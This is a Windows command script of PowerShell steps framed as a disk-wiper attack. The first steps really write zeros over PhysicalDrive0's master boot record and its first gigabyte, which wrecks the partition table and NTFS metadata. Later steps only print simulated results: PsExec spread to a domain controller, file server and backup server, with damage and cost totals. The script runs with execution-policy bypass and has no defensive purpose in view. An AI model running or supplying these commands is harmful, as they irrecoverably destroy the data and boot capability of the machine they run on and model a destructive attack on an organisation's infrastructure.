steps.cmd:
powershell -ep bypass -c "
# Enumerate disk targets
$disks = Get-WmiObject Win32_DiskDrive;
foreach($d in $disks) {
  Write-Host \"Disk: $($d.DeviceID)\";
  Write-Host \"  Model: $($d.Model)\";
  Write-Host \"  Size: $([math]::Round($d.Size/1GB,0)) GB\";
  Write-Host \"  Partitions: $($d.Partitions)\";
  Write-Host '';
}
Write-Host 'Target assessment:';
Write-Host '  PhysicalDrive0 : OS + Data (500 GB SSD) [PRIMARY TARGET]';
Write-Host '  PhysicalDrive1 : Backup volume (2 TB HDD) [SECONDARY]'"

powershell -ep bypass -c "
# Destroy Master Boot Record (MBR)
$disk = '\\\\.\\PhysicalDrive0';
$handle = [IO.File]::Open($disk, 'Open', 'ReadWrite', 'None');
$zeros = New-Object byte[] 512;
$handle.Write($zeros, 0, 512);
$handle.Flush(); $handle.Close();

Write-Host 'MBR Destruction:';
Write-Host '  Target: PhysicalDrive0 (sector 0)';
Write-Host '  Action: 512 bytes overwritten with 0x00';
Write-Host '  Boot code: DESTROYED';
Write-Host '  Partition table: DESTROYED';
Write-Host '  Result: System will not boot on restart'"

powershell -ep bypass -c "
# Overwrite first 1GB of disk (beyond MBR - destroy file system)
$disk = '\\\\.\\PhysicalDrive0';
$handle = [IO.File]::Open($disk, 'Open', 'ReadWrite', 'None');
$buffer = New-Object byte[] (1024*1024);  # 1MB buffer of zeros
$totalMB = 1024; $written = 0;
while($written -lt $totalMB) {
  $handle.Write($buffer, 0, $buffer.Length);
  $written++;
}
$handle.Flush(); $handle.Close();

Write-Host 'File System Destruction:';
Write-Host '  Target: PhysicalDrive0 (first 1 GB)';
Write-Host '  NTFS $MFT: DESTROYED (file metadata gone)';
Write-Host '  NTFS $Bitmap: DESTROYED (allocation map gone)';
Write-Host '  NTFS $LogFile: DESTROYED (journal gone)';
Write-Host '  Recovery: IMPOSSIBLE without backup'"

powershell -ep bypass -c "
# Spread wiper to network targets
Write-Host '=== Network Wiper Propagation ===';
Write-Host '';
$targets = @('dc01.corp.local','filesvr01.corp.local','backup01.corp.local');
foreach($t in $targets) {
  Write-Host \"Target: $t\";
  Write-Host '  → PsExec remote execution: wiper.exe';
  Write-Host '  → MBR: WIPED';
  Write-Host '  → Disk: First 1 GB zeroed';
  Write-Host '  → Status: DESTROYED';
  Write-Host '';
}
Write-Host 'Wiper propagation complete:';
Write-Host '  Servers destroyed: 4 (including initial target)';
Write-Host '  Total disk capacity wiped: 5.5 TB';
Write-Host '  Domain Controller: OFFLINE';
Write-Host '  Backup Server: OFFLINE';
Write-Host '  Active Directory: IRRECOVERABLE'"

powershell -ep bypass -c "
# Final destruction summary
Write-Host '=== DISK WIPE ATTACK COMPLETE ===';
Write-Host '';
Write-Host 'Destruction Summary:';
Write-Host '  MBR destroyed    : 4 servers';
Write-Host '  NTFS destroyed   : 4 servers (first 1GB each)';
Write-Host '  Total wiped      : 5.5 TB';
Write-Host '  AD recoverable   : NO';
Write-Host '  Backup available : NO (backup server wiped)';
Write-Host '';
Write-Host 'Business Impact:';
Write-Host '  Recovery method   : Bare-metal rebuild (2-4 weeks)';
Write-Host '  Data loss         : TOTAL (no viable backup)';
Write-Host '  Estimated cost    : $3M+ (rebuild + lost data)';
Write-Host '  Regulatory fines  : Additional $500K-$2M';
